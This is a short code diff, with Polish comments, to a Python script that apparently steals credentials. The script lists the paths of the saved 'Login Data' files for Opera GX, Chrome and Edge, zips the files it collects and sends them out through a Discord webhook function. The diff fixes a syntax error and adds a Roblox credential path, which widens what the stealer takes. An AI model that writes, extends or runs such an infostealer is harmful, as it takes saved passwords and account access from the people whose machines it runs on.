@@ -2,6 +2,7 @@ import os
 import shutil
 import zipfile
 import requests
+import sys  # Dodany import sys
 
 
 # URL webhooków (możesz dostosować je w zależności od użytkownika)
@@ -38,8 +39,8 @@ def send_file_to_discord(file_path, webhook_url):
 login_data_paths = {
     "Opera GX": r"AppData\Roaming\Opera Software\Opera GX Stable\Login Data",
     "Google Chrome": r"AppData\Local\Google\Chrome\User Data\Default\Login Data",
-    "Microsoft Edge": r"AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
-    "Roblox"
+    "Microsoft Edge": r"AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
+    "Roblox": r"AppData\Local\Roblox\user_data\Login Data"  # Dodana ścieżka dla Roblox
 }
 
 # Funkcja do tworzenia pliku ZIP
